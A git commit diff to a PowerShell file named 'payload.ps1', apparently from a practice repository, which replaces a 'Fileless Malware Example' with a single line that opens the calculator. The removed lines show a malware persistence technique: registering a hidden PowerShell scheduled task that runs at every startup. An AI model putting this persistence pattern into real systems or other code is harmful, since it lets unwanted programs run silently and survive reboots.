5fd1d145ace1d3031ddbc2c4534e78a1c7e0a445
melissa172714 <146184999+melissa172714@users.noreply.github.com>
2024-12-04 17:06:08 +0100

    Update payload.ps1

--- payload.ps1
+++ payload.ps1
@@ -1,11 +1,4 @@
-# Script à exécuter en mémoire
-$code = {
-    # Code à exécuter, par exemple, ouvrir calc.exe
-    Start-Process "calc.exe"
+# Exemple simple : ouvrir la calculatrice
+Start-Process "calc.exe"
 
-    # Persistance : Créer une tâche planifiée en mémoire
-    $TaskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -WindowStyle Hidden -Command Start-Process 'calc.exe'"
-    $TaskTrigger = New-ScheduledTaskTrigger -AtStartup
-    Register-ScheduledTask -Action $TaskAction -Trigger $TaskTrigger -TaskName "MemoryTask" -Description "Fileless Malware Example"
-}
-Invoke-Command -ScriptBlock $code
+# Ajoutez ici toute autre logique à exécuter
